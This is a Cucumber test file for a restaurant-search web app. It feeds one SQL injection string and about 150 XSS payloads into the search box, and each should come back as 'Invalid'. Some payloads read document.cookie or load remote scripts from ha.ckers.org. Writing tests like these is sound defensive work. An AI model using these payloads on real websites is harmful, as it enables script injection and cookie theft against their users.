Feature: Testing SQL injections

    Background:

        Given I am on searchPage

    Scenario: S1 - SQL Injection

        When I enter "1'--\nSHOW TABLES" in the search box
        And I press Im Hungry
        Then I should see "7" search results for "Burger"

    Scenario: S3 - Cross scripting attach

        When I enter "a<script>alert('alert');</script>" in the search box
        And I press Im Hungry
        Then I should see "1" search results for "Invalid"

    # Scenario: S4 - Serialized Cross scripting attach
	Scenario: S1 XSS Test 1

		When I enter "<body oninput=javascript:alert(1)><input autofocus>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S2 XSS Test 2

		When I enter "<math href=\"javascript:javascript:alert(1)\">CLICKME</math> <math> <maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:javascript:alert(1)\">CLICKME</maction> </math>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S3 XSS Test 3

		When I enter "<frameset onload=javascript:alert(1)>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S4 XSS Test 4

		When I enter "<table background=\"javascript:javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S5 XSS Test 5

		When I enter "<!--<img src=\"--><img src=x onerror=javascript:alert(1)//\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S6 XSS Test 6

		When I enter "<comment><img src=\"</comment><img src=x onerror=javascript:alert(1))//\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S7 XSS Test 7

		When I enter "<![><img src=\"]><img src=x onerror=javascript:alert(1)//\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S8 XSS Test 8

		When I enter "<style><img src=\"</style><img src=x onerror=javascript:alert(1)//\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S9 XSS Test 9

		When I enter "<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S10 XSS Test 10

		When I enter "<head><base href=\"javascript://\"></head><body><a href=\"/. /,javascript:alert(1)//#\">XXX</a></body>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S11 XSS Test 11

		When I enter "<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S12 XSS Test 12

		When I enter "<OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S13 XSS Test 13

		When I enter "<object data=\"data:text/html;base64,%(base64)s\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S14 XSS Test 14

		When I enter "<embed src=\"data:text/html;base64,%(base64)s\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S15 XSS Test 15

		When I enter "<b <script>alert(1)</script>0" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S16 XSS Test 16

		When I enter "<div id=\"div1\"><input value=\"``onmouseover=javascript:alert(1)\"></div> <div id=\"div2\"></div><script>document.getElementById(\"div2\").innerHTML = document.getElementById(\"div1\").innerHTML;</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S17 XSS Test 17

		When I enter "<x '=\"foo\"><x foo='><img src=x onerror=javascript:alert(1)//'>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S18 XSS Test 18

		When I enter "<embed src=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S19 XSS Test 19

		When I enter "<img src=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S20 XSS Test 20

		When I enter "<image src=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S21 XSS Test 21

		When I enter "<script src=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S22 XSS Test 22

		When I enter "<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S23 XSS Test 23

		When I enter "<? foo=\"><script>javascript:alert(1)</script>\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S24 XSS Test 24

		When I enter "<! foo=\"><script>javascript:alert(1)</script>\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S25 XSS Test 25

		When I enter "</ foo=\"><script>javascript:alert(1)</script>\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S26 XSS Test 26

		When I enter "<? foo=\"><x foo='?><script>javascript:alert(1)</script>'>\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S27 XSS Test 27

		When I enter "<! foo=\"[[[Inception]]\"><x foo=\"]foo><script>javascript:alert(1)</script>\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S28 XSS Test 28

		When I enter "<% foo><x foo=\"%><script>javascript:alert(1)</script>\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S29 XSS Test 29

		When I enter "<div id=d><x xmlns=\"><iframe onload=javascript:alert(1)\"></div> <script>d.innerHTML=d.innerHTML</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S30 XSS Test 30

		When I enter "<img \x00src=x onerror=\"alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S31 XSS Test 31

		When I enter "<img \x47src=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S32 XSS Test 32

		When I enter "<img \x11src=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S33 XSS Test 33

		When I enter "<img \x12src=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S34 XSS Test 34

		When I enter "<img\x47src=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S35 XSS Test 35

		When I enter "<img\x10src=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S36 XSS Test 36

		When I enter "<img\x13src=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S37 XSS Test 37

		When I enter "<img\x32src=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S38 XSS Test 38

		When I enter "<img\x47src=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S39 XSS Test 39

		When I enter "<img\x11src=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S40 XSS Test 40

		When I enter "<img \x47src=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S41 XSS Test 41

		When I enter "<img \x34src=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S42 XSS Test 42

		When I enter "<img \x39src=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S43 XSS Test 43

		When I enter "<img \x00src=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S44 XSS Test 44

		When I enter "<img src\x09=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S45 XSS Test 45

		When I enter "<img src\x10=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S46 XSS Test 46

		When I enter "<img src\x13=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S47 XSS Test 47

		When I enter "<img src\x32=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S48 XSS Test 48

		When I enter "<img src\x12=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S49 XSS Test 49

		When I enter "<img src\x11=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S50 XSS Test 50

		When I enter "<img src\x00=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S51 XSS Test 51

		When I enter "<img src\x47=x onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S52 XSS Test 52

		When I enter "<img src=x\x09onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S53 XSS Test 53

		When I enter "<img src=x\x10onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S54 XSS Test 54

		When I enter "<img src=x\x11onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S55 XSS Test 55

		When I enter "<img src=x\x12onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S56 XSS Test 56

		When I enter "<img src=x\x13onerror=\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S57 XSS Test 57

		When I enter "<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S58 XSS Test 58

		When I enter "<img src=x onerror=\x09\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S59 XSS Test 59

		When I enter "<img src=x onerror=\x10\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S60 XSS Test 60

		When I enter "<img src=x onerror=\x11\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S61 XSS Test 61

		When I enter "<img src=x onerror=\x12\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S62 XSS Test 62

		When I enter "<img src=x onerror=\x32\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S63 XSS Test 63

		When I enter "<img src=x onerror=\x00\"javascript:alert(1)\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S64 XSS Test 64

		When I enter "<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S65 XSS Test 65

		When I enter "<img src=\"x` `<script>javascript:alert(1)</script>\"` `>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S66 XSS Test 66

		When I enter "<img src onerror /\" '\"= alt=javascript:alert(1)//\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S67 XSS Test 67

		When I enter "<title onpropertychange=javascript:alert(1)></title><title title=>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S68 XSS Test 68

		When I enter "<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x onerror=javascript:alert(1)></a>\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S69 XSS Test 69

		When I enter "<!--[if]><script>javascript:alert(1)</script -->" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S70 XSS Test 70

		When I enter "<!--[if<img src=x onerror=javascript:alert(1)//]> -->" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S71 XSS Test 71

		When I enter "<script src=\"/\%(jscript)s\"></script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S72 XSS Test 72

		When I enter "<script src=\"\\%(jscript)s\"></script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S73 XSS Test 73

		When I enter "<object id=\"x\" classid=\"clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598\"></object> <object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" onqt_error=\"javascript:alert(1)\" style=\"behavior:url(#x);\"><param name=postdomevents /></object>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S74 XSS Test 74

		When I enter "<a style=\"-o-link:'javascript:javascript:alert(1)';-o-link-source:current\">X" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S75 XSS Test 75

		When I enter "<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S76 XSS Test 76

		When I enter "<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S77 XSS Test 77

		When I enter "<style>@import \"data:,*%7bx:expression(javascript:alert(1))%7D\";</style>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S78 XSS Test 78

		When I enter "<a style=\"pointer-events:none;position:absolute;\"><a style=\"position:absolute;\" onclick=\"javascript:alert(1);\">XXX</a></a><a href=\"javascript:javascript:alert(1)\">XXX</a>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S79 XSS Test 79

		When I enter "<style>*[{}@import'%(css)s?]</style>X" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S80 XSS Test 80

		When I enter "<div style=\"font-family:'foo&#10;;color:red;';\">XXX" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S81 XSS Test 81

		When I enter "<div style=\"font-family:foo}color=red;\">XXX" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S82 XSS Test 82

		When I enter "<// style=x:expression\28javascript:alert(1)\29>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S83 XSS Test 83

		When I enter "<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S84 XSS Test 84

		When I enter "<div style=content:url(%(svg)s)></div>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S85 XSS Test 85

		When I enter "<div style=\"list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));\">X" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S86 XSS Test 86

		When I enter "<div id=d><div style=\"font-family:'sans\27\3B color\3Ared\3B'\">X</div></div> <script>with(document.getElementById(\"d\"))innerHTML=innerHTML</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S87 XSS Test 87

		When I enter "<div style=\"background:url(/f#&#127;oo/;color:red/*/foo.jpg);\">X" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S88 XSS Test 88

		When I enter "<div style=\"font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);\">X" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S89 XSS Test 89

		When I enter "<div id=\"x\">XXX</div> <style> #x{font-family:foo[bar;color:green;} #y];color:red;{} </style>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S90 XSS Test 90

		When I enter "<x style=\"background:url('x&#1;;color:red;/*')\">XXX</x>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S91 XSS Test 91

		When I enter "<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S92 XSS Test 92

		When I enter "<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S93 XSS Test 93

		When I enter "<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S94 XSS Test 94

		When I enter "<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S95 XSS Test 95

		When I enter "<meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S96 XSS Test 96

		When I enter "<meta charset=\"x-imap4-modified-utf7\">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S97 XSS Test 97

		When I enter "<meta charset=\"mac-farsi\">¼script¾javascript:alert(1)¼/script¾" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S98 XSS Test 98

		When I enter "X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S99 XSS Test 99

		When I enter "1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S100 XSS Test 100

		When I enter "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S101 XSS Test 101

		When I enter "perl -e 'print \"<IMG SRC=java\0script:alert(\\"XSS\\")>\";' > out" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S102 XSS Test 102

		When I enter "<IMG SRC=\" &#14; javascript:alert('XSS');\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S103 XSS Test 103

		When I enter "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S104 XSS Test 104

		When I enter "<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(\"XSS\")>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S105 XSS Test 105

		When I enter "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S106 XSS Test 106

		When I enter "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S107 XSS Test 107

		When I enter "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S108 XSS Test 108

		When I enter "<SCRIPT SRC=//ha.ckers.org/.j>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S109 XSS Test 109

		When I enter "<IMG SRC=\"javascript:alert('XSS')\"" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S110 XSS Test 110

		When I enter "<iframe src=http://ha.ckers.org/scriptlet.html <" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S111 XSS Test 111

		When I enter "\\";alert('XSS');//" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S112 XSS Test 112

		When I enter "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S113 XSS Test 113

		When I enter "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S114 XSS Test 114

		When I enter "<BODY BACKGROUND=\"javascript:alert('XSS')\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S115 XSS Test 115

		When I enter "<IMG DYNSRC=\"javascript:alert('XSS')\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S116 XSS Test 116

		When I enter "<IMG LOWSRC=\"javascript:alert('XSS')\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S117 XSS Test 117

		When I enter "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S118 XSS Test 118

		When I enter "<IMG SRC='vbscript:msgbox(\"XSS\")'>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S119 XSS Test 119

		When I enter "<IMG SRC=\"livescript:[code]\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S120 XSS Test 120

		When I enter "<BODY ONLOAD=alert('XSS')>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S121 XSS Test 121

		When I enter "<BGSOUND SRC=\"javascript:alert('XSS');\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S122 XSS Test 122

		When I enter "<BR SIZE=\"&{alert('XSS')}\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S123 XSS Test 123

		When I enter "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S124 XSS Test 124

		When I enter "<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S125 XSS Test 125

		When I enter "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S126 XSS Test 126

		When I enter "<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S127 XSS Test 127

		When I enter "<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S128 XSS Test 128

		When I enter "<STYLE>@im\port'\ja\vasc\ript:alert(\"XSS\")';</STYLE>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S129 XSS Test 129

		When I enter "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S130 XSS Test 130

		When I enter "exp/*<A STYLE='no\xss:noxss(\"*//*\");xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S131 XSS Test 131

		When I enter "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S132 XSS Test 132

		When I enter "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S133 XSS Test 133

		When I enter "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S134 XSS Test 134

		When I enter "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S135 XSS Test 135

		When I enter "<XSS STYLE=\"xss:expression(alert('XSS'))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S136 XSS Test 136

		When I enter "<XSS STYLE=\"behavior: url(xss.htc);\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S137 XSS Test 137

		When I enter "¼script¾alert(¢XSS¢)¼/script¾" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S138 XSS Test 138

		When I enter "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S139 XSS Test 139

		When I enter "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S140 XSS Test 140

		When I enter "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S141 XSS Test 141

		When I enter "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S142 XSS Test 142

		When I enter "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S143 XSS Test 143

		When I enter "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S144 XSS Test 144

		When I enter "<TABLE BACKGROUND=\"javascript:alert('XSS')\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S145 XSS Test 145

		When I enter "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S146 XSS Test 146

		When I enter "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S147 XSS Test 147

		When I enter "<DIV STYLE=\"background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S148 XSS Test 148

		When I enter "<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S149 XSS Test 149

		When I enter "<DIV STYLE=\"width: expression(alert('XSS'));\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S150 XSS Test 150

		When I enter "<BASE HREF=\"javascript:alert('XSS');//\">" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S151 XSS Test 151

		When I enter " <OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S152 XSS Test 152

		When I enter "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>" in the search box
		And I press Im Hungry
		Then I should see "1" search results for "Invalid"

	Scenario: S153 XSS Test 153

